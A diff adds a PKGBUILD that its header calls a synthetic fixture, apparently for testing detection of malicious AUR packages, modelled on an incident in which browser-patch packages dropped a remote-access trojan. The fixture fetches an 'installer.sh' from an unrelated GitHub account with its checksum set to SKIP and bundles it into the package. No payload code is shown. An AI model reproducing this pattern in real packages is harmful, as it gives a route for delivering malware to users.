@@ -1,0 +1,25 @@
+# SYNTHETIC FIXTURE - not real malware. Reproduces the *shape* of the July 2025
+# AUR incident (browser-patch packages that dropped CHAOS RAT): a plausible
+# package whose sources include an "installer" script hosted under a GitHub
+# account unrelated to url=, with SKIP instead of a checksum, executed from the
+# .install hook as root.
+
+pkgname=librewolf-patched-bin
+pkgver=141.0.1
+pkgrel=1
+pkgdesc="LibreWolf with community patches (prebuilt)"
+arch=('x86_64')
+url="https://github.com/librewolf-community/settings"
+license=('MPL-2.0')
+depends=('gtk3' 'nss')
+install="${pkgname}.install"
+source=("$pkgname-$pkgver.tar.xz::$url/releases/download/v$pkgver/librewolf-$pkgver.tar.xz"
+        "patch-installer.sh::https://raw.githubusercontent.com/dev-updates-cdn/patcher/main/installer.sh")
+sha256sums=('4c1c9a1f2ba0f6f6e6d9c8b7a695847362514f3e2d1c0b9a8877665544332211'
+            'SKIP')
+
+package() {
+  install -Dm755 "$srcdir/librewolf" "$pkgdir/usr/lib/librewolf/librewolf"
+  install -Dm755 "$srcdir/patch-installer.sh" \
+    "$pkgdir/usr/share/$pkgname/patch-installer.sh"
+}
